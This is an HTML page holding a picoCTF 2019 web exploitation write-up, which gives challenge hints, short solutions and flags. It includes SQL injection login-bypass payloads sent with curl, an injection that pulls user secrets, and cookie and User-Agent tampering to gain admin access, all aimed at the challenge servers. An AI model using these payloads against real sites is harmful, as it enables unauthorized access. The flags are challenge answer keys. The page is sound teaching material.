&lt;<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> picoCTF2019 | Reverse Engineering Writeup </title>
    <link rel="shortcut icon" href="../../../../img/favicon.ico" width="70">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800,900|Cormorant+Garamond:300,300i,400,400i,500,500i,600,600i,700,700i">
      <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/css/bootstrap.min.css" integrity="sha384-Smlep5jCw/wG7hdkwQ/Z5nLIefveQRIY9nfy6xoR1uRYBtpZgI6339F5dgvm/e9B" crossorigin="anonymous">
      <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
      <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism.min.css"> -->
      <link rel="stylesheet" href="../../../../css/style.css">
      <link rel="stylesheet" href="../../../../css/personal_icon.css">
      <link rel="stylesheet" href="../../../../res/prism_themes/prism-base16-ateliersulphurpool.light.css">
      <link rel="stylesheet" href="../ctf.css">
      <link rel="stylesheet" href="../../css/sidebar.css">
  </head>
  <body>

    <!-- Navbar -->

    <header>
      <a href="../../../../index.html" class="header-logo"><img src="../../../../img/lion-logo.png" alt="Logo" width="75"></a>
      <a href="../../../../index.html" class="header-brand"> CAPTAIN </a>
      <nav>
          <ul>
            <li><a href="../../../python/python.html"> Python </a> </li>
            <li><a href="../../../c_plus_plus/c_plus_plus.html"> C / C++ </a> </li>
            <li><a href="../../basc.html"> BASC </a> </li>
            <li><a href="../../../machine_learning/machine_learning.html"> ML </a> </li>
            <li><a href="../../../android/android.html"> Android </a> </li>
            <li><a href="../../../raspberry/raspberry.html"> Raspberry </a> </li>
            <li><a href="../../../../library/library.html"> Library </a> </li>
            <li><a href="../../../../whoami.html"> WhoAmI </a> </li>
          </ul>
          <div id="dropdown-header" class="dropdown">
            <button class="dropbtn"> Last Projects </button>
              <div class="dropdown-content active">
                <a href="#"> Last Project 1 </a>
                <a href="#"> Last Project 1 </a>
                <a href="#"> Last Project 1 </a>
                <a href="#"> Last Project 1 </a>
                <a href="#"> Last Project 1 </a>
             </div>
        </div>
      </nav>
      <div class="menu-toggle">
        <i class="fa fa-bars" aria-hidden="true"></i>
      </div>
    </header>


    <!-- Return to Top -->
    <a href="javascript:" id="return-to-top"><i class="fas fa-chevron-up"></i></a>

    <!-- Sidebar Nav -->
    <div id="nav" class="navigation">
      <div class="navigation__inner">
        <!--   Content   -->
        <h5> picoCTF2019 </h5>
        <ul>
            <li><a href="binary.html"> Binary </a></li>
            <li><a href="cryptography.html"> Cryptography </a></li>
            <li><a href="forensics.html"> Forensics </a></li>
            <li><a href="general_skill.html"> General Skill </a></li>
            <li><a href="reverse_engineering.html"> Reverse Engineering </a></li>
            <li><a href="web_exploitation.html"> Web Exploitation </a></li>
        </ul>
        <h5> OverTheWire</h5>
        <ul>
            <li><a href="../OverTheWire/bandit.html"> Bandit </a></li>
            <li><a href="../OverTheWire/leviathan.html"> Leviathan </a></li>
        </ul>
        <br>
      </div>
    </div>

    <!-- Main -->
    <main>
    <div class="swipe-area"></div>
    <br><br><br>
    <div class="container">
      <article role="article">
    		<h3> Web Exploitation Writeup </h3>
        <br>

        <dl class="toc">
          <h4> Table of Contents </h4>
          <ol>
            <li> <a href="#insp3ct0r"> Insp3ct0r - Points: 50 </a></li>
            <li> <a href="#dont-use-client-side"> dont-use-client-side - Points: 100 </a></li>
            <li> <a href="#logon"> logon - Points: 100 </a></li>
            <li> <a href="#where-are-the-robots"> where are the robots - Points: 100 </a></li>
            <li> <a href="#client-side-again"> Client-side-again - Points: 200 </a></li>
            <li> <a href="#open-to-admins"> Open-to-admins - Points: 200 </a></li>
            <li> <a href="#picobrowser"> picobrowser - Points: 200  </a></li>
            <li> <a href="#irish-name-repo-1"> Irish-Name-Repo 1 - Points: 300 </a></li>
            <li> <a href="#irish-name-repo-2"> Irish-Name-Repo 2 - Points: 350 </a></li>
            <li> <a href="#irish-name-repo-3"> Irish-Name-Repo 3 - Points: 400 </a></li>
            <li> <a href="#empire1"> Empire1 - Points: 400 </a></li>
            <li> <a href="#empire2"> Empire2 - Points: 450 </a></li>
          </ol>
        </dl>
        <hr style="margin-bottom: 3em; width: 30%; margin-left: 35%;">

        <dl class="anchor" id="insp3ct0r">
          <dt> Insp3ct0r - Points: 50 </dt>
          <dd> Kishor Balan tipped us off that the following code may need inspection: https://2019shell1.picoctf.com/problem/63975/ (link) or http://2019shell1.picoctf.com:63975 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> How do you inspect web code on a browser? There's 3 parts </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-text">
Analyze html, css and js
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?d3db9182} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->


        <dl class="anchor" id="dont-use-client-side">
          <dt> dont-use-client-side - Points: 100 </dt>
          <dd> Can you break into this super secure portal? https://2019shell1.picoctf.com/problem/45147/ (link) or http://2019shell1.picoctf.com:45147 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> Never trust the client </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-text">
Find the flag viewing source
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{no_clients_plz_4a60f3} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

        <dl class="anchor" id="logon">
          <dt> logon - Points: 100 </dt>
          <dd> The factory is hiding things from all of its users. Can you login as logon and find what they've been looking at? https://2019shell1.picoctf.com/problem/32270/ (link) or http://2019shell1.picoctf.com:32270 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> Hmm it doesn't seem to check anyone's password, except for {{name}}'s? </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-text">
- Log in as admin
- Inspect element and check for Storage (we are looking for cookies)
- Change the value of admin line to True instead of False
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{l3arn_th3_r0p35} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

        <dl class="anchor" id="where-are-the-robots">
          <dt> where are the robots - Points: 100 </dt>
          <dd> Can you find the robots? https://2019shell1.picoctf.com/problem/32229/ (link) or http://2019shell1.picoctf.com:32229 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> What part of the website could tell you where the creator doesn't want you to look? </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
$ wget --spider -r --no-parent http://2019shell1.picoctf.com:32229
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{ca1cu1at1ng_Mach1n3s_0ecd0} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->


        <dl class="anchor" id="client-side-again">
          <dt> Client-side-again - Points: 200 </dt>
          <dd> Can you break into this super secure portal? https://2019shell1.picoctf.com/problem/47277/ (link) or http://2019shell1.picoctf.com:47277 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> What is obfuscation? </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-text">
Analyze the javascript and reoder it
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{not_this_again_d29871} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

        <dl class="anchor" id="open-to-admins">
          <dt> Open-to-admins - Points: 200 </dt>
          <dd> This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://2019shell1.picoctf.com/problem/12276/ (link) or http://2019shell1.picoctf.com:12276 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> Can cookies help you to get the flag? </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
$ curl "https://2019shell1.picoctf.com/problem/12276/flag" -H "Cookie: time=1400; admin=True;" -s | grep -oE "picoCTF{.*}"
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{0p3n_t0_adm1n5_dcb566bb} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

        <dl class="anchor" id="picobrowser">
          <dt> picobrowser - Points: 200 </dt>
          <dd> This website can be rendered only by picobrowser, go and catch the flag! https://2019shell1.picoctf.com/problem/12255/ (link) or http://2019shell1.picoctf.com:12255 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> You dont need to download a new web browser </p>
          </blockquote>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
$ curl "https://2019shell1.picoctf.com/problem/12255/flag" -H "User-Agent:picobrowser" -s | grep -oE "picoCTF{.*}"
          </code></pre>
        </div>
        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->


        <dl class="anchor" id="irish-name-repo-1">
          <dt> Irish-Name-Repo 1 - Points: 300 </dt>
          <dd> There is a website running at https://2019shell1.picoctf.com/problem/32241/ (link) or http://2019shell1.picoctf.com:32241. Do you think you can log us in? Try to see if you can login! </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database? </p>
          </blockquote>
          <blockquote>
            <p><strong>Hint:</strong> Try to think about how does the website verify your login?</p>
          </blockquote>
        </dl>

        <dl>
          <dd> It's a SQL injection type challenge. In the login form page, look for the debug line (CTRL + U to view source code) and change the value to 1 and try to submit a randomly login request  </dd>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-html">
&lt;input type="hidden" name="debug" value="1">
          </code></pre>
        </div>

        <dl>
          <dd> Output should looks like as following  </dd>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-text">
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

Login failed.
          </code></pre>
        </div>

        <dl>
          <dd> To bypass the authentication login SQLi string is needed  </dd>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
# 'or 1=1 --
curl "https://2019shell1.picoctf.com/problem/32241/login.php" --data "username='+or+1=1+--&password=1234" && echo
          </code></pre>
        </div>
        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{s0m3_SQL_0397f20c} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->


        <dl class="anchor" id="irish-name-repo-2">
          <dt> Irish-Name-Repo 2 - Points: 350 </dt>
          <dd> There is a website running at https://2019shell1.picoctf.com/problem/14912/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:14912 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> The password is being filtered. </p>
          </blockquote>
        </dl>

        <dl>
          <dd> As the previous one, it's a SQL injection type challenge. The only difference this time it's that a check to our input is performed. The following do the job to solve this challenge </dd>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
curl "https://2019shell1.picoctf.com/problem/14912/login.php" --data "username='+--&password=admin" && echo
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{m0R3_SQL_plz_752d1173} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->


        <dl class="anchor" id="irish-name-repo-3">
          <dt> Irish-Name-Repo 3 - Points: 400 </dt>
          <dd> There is a secure website running at https://2019shell1.picoctf.com/problem/47247/ (link) or http://2019shell1.picoctf.com:47247. Try to see if you can login as admin! </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> Seems like the password is encrypted. </p>
          </blockquote>
        </dl>

        <dl>
          <dd> As the previous one, it's a SQL injection type challenge. However this time the password seems to be encrypted in some way. After setting the value of debug to 1 as before and performed an authentication request, the output is: </dd>
        </dl>

      <div class="row-full code">
        <pre><code class="prism language-text">
password: 'or 1=1--
SQL query: SELECT * FROM admin where password = ''be 1=1--'
        </code></pre>
      </div>

        <dl>
          <dd> To solve this challenge the same encryption is needed </dd>
        </dl>

        <div class="row-full code">
          <pre><code class="prism language-bash">
# 'be 1=1 --
curl "https://2019shell1.picoctf.com/problem/47247/login.php" --data "password='+be+1=1+--" && echo
          </code></pre>
        </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{3v3n_m0r3_SQL_c2c37f5e} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

        <dl class="anchor" id="empire1">
          <dt> Empire1 - Points: 400 </dt>
          <dd> Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. https://2019shell1.picoctf.com/problem/49726/ (link) Can you first find the secret code they assigned to you? or http://2019shell1.picoctf.com:49726 </dd>
        </dl>
        <dl>
          <blockquote>
            <p><strong>Hint:</strong> Pay attention to the feedback you get </p>
          </blockquote>
          <blockquote>
            <p><strong>Hint:</strong> There is *very* limited filtering in place - this to stop you from breaking the challenge for yourself, not for you to bypass. </p>
          </blockquote>
          <blockquote>
            <p><strong>Hint:</strong> The database gets reverted every 2 hours if you do break it, just come back later </p>
          </blockquote>
        </dl>

        <dl>
          <dd> SQLi on the register/login page is the first thing that has been tried: these pages doesn’t seem to be vulnerable to SQLi. So an user has been created. After the login, the first thing has been noticed is the todo page, a simple injection has been tried. It didn't work, again, but an error has been displayed after. It's the right way. After some others attempt and some research, the string which helped to solve the challenge is: </dd>
        </dl>

      <div class="row-full code">
        <pre><code class="prism language-text">
'||( select group_concat(secret) from user) ||'
        </code></pre>
      </div>

        <div class="scrolling-wrapper">
        <dl>
          <blockquote>
            <p class="ctf"><strong> picoCTF{wh00t_it_a_sql_injectdf389592} </strong></p>
          </blockquote>
        </dl>
        </div>
        <hr> <!-- Finish post  -->

    	</article>

      <section class="" role="group">
        <button id="previous" onClick="location.href='reverse_engineering.html'" > Previous </button>
        <button id="next" onClick="location.href='binary.html'"> Next </button>
        <br> <br> <br>
      </section>


      </div>
    </main>

    <footer id="myFooter">
      <div class="footer">
        <a href="https://github.com/CaptainMich" class="social-icons"><i class="fab fa-github"></i></i></a>
        <a href="https://twitter.com/_CaptainMich" class="social-icons"><i class="fab fa-twitter"></i></a>
        <a href="mailto:captain.mich96@gmail.com" class="social-icons"><i class="fas fa-envelope"></i></a>

          <ul>
              <li><a href="#">Site Information</a></li>
              <li><a href="#">Contact me</a></li>
              <li><a href="#">Reviews</a></li>
              <li><a href="#">Terms of service</a></li>
          </ul>
          <p class="footer-copyright">© 2018 Mich, Inc. All rights reserved.</p>
      </div>
    </footer>

    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/js/bootstrap.min.js" integrity="sha384-o+RDsa0aLu++PJvFqy8fFScvbHFLtbvScb8AjopnFD+iEQ7wo/CG0xlczd+2O/em" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <script type="text/javascript" src="https://unpkg.com/ionicons@4.1.2/dist/ionicons.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/prism.min.js"></script>
    <script type="text/javascript" src="../../../../js/jquery.touchSwipe.min.js"></script>
    <script type="text/javascript"src="../../js/sidebar.js"> </script>
    <script type="text/javascript" src="../../../../js/menu.js"></script>
    <script type="text/javascript" src="../../../../js/return_to_top_arrow.js"></script>
    <script type="text/javascript" src="../../../../res/prism_themes/prism_lb.js"></script>
  </body>
</html>
